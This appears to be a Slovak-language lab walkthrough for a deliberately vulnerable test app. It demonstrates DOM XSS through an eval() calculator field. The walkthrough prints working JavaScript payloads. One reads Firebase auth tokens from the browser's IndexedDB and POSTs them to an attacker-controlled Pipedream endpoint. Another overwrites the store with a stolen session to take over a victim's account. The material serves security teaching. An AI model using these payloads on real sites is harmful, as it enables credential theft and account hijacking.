# Document object model cross site scripting (DOM XSS)

### Prostredie: Dp-Test-Enviroment - https://github.com/MatusVetrik/dp-test-enviroment

- Pri útoku využijeme zraniteľnú funkciu eval(), ktorá vyhodnotí vloženú hodnotu v akomkoľvek tvare.
- Každopádne tým, že vyhodnotí akúkoľvek hodnotu, vyhodnotí aj škodlivý kód, ktorý ako argument vložíme.
- Vstup s textom "Enter equation..." vyhodnocuje práve funkcia eval() a predpokladáme, že na tomto mieste vzniká zraniteľnosť.
- Pokúsime sa o ukradnutie puživateľoských dát z databázy prehliadača. Do vstupu vložíme nasledujovný kód:
    
          const request = window.indexedDB.open("firebaseLocalStorageDb");
            request.onsuccess = (event) => {
              const db = event.target.result;

              const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
              const objectStore = transaction.objectStore("firebaseLocalStorage");

              const getDataRequest = objectStore.getAll();

              getDataRequest.onsuccess = (event) => {

              const headers = new Headers();
              headers.append("Content-Type", "text/plain");

              const options = {
                method: "POST",
                headers,
                mode: "cors",
                body: JSON.stringify(event.target.result),
              };

              // Doplnit endpoint vygenerovany sluzbou Pipedream
              fetch("pipedream-endpoint", options); 
              }
            };
- Tento kód sprístupní lokálnu databázu (indexDB) prehliadača a umožní nám vytiahnúť hodnoty z databázy. Nás momentálne zaujíma tabuľka "firebaseLocalStorage", ktorú nastavuje
  externá API Firebase, ktorú používa aplikácia na autentifikáciu. Po jej vytiahnutí sa celý objekt odošle na náš vytvorený endpoint v službe Pipedreame.
- V kóde sa nachádza komentár nad funkciou fetch(). Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvoríme
  nový projekt. Po vytvorení projketu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do nášho kódu.
- Kód vložíme do vstupného poľa a stalčíme "Enter".
- Teraz sa môžeme odhlásiť a prihlásiť sa do lubovoľného účtu, ktorý už máme vytvorený alebo si vytvoríme nový.
- Prejdeme znova na obrazovku s kalkulačkou a vložíme nasledujúci kód do rovnakého vstupu.
        const request = window.indexedDB.open("firebaseLocalStorageDb");
        request.onsuccess = (event) => {
          const db = event.target.result;
  
          const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
          const objectStore = transaction.objectStore("firebaseLocalStorage");
  
          const data = {
          fbase_key: "random-fbase-key",
          value: {
            uid: "RTejhfCWw1OAlHcoAj41Fy93ZJJ3",
            email: "test@gmail.com",
            emailVerified: false,
            isAnonymous: false,
            providerData: [
              {
                providerId: "password",
                uid: "test@gmail.com",
                displayName: null,
                email: "test@gmail.com",
                phoneNumber: null,
                photoURL: null,
              },
            ],
            stsTokenManager: {
              refreshToken: "random-refresh-token",
              accessToken: "random-access-token",
              expirationTime: 1712794096425,
            },
            createdAt: "1711383904315",
            lastLoginAt: "1711790596471",
            apiKey: "random-api-key",
            appName: "[DEFAULT]",
          },
        };
  
          objectStore.clear()
  
          const addDataRequest = objectStore.add(data);
  
          addDataRequest.onsuccess = (event) => alert("Success!");
        };
- Kód uloží, respektíve prepíše dáta o prihlásenom používateľovi. Objekt "data" v ukážke je len na demonštráciu . Nahradíme ho objektom, ktorý nám prišiel na vytvorený ednpoint.
    Objekt bude pravdepodobne treba preformátovať, takže názvy atribútov objektu musia byť bez úvodzoviek, tak ako tomu je v ukážkovom objekte.
- Po kliknuti klávesy "Enter" sme si do prehliadača uložili prihlasovacie údaje iného používateľa a teraz sme prihlásený pod jeho prihalsovacimi údajmi.
- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/dom-xss-eval.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/dom-xss-eval.mp4)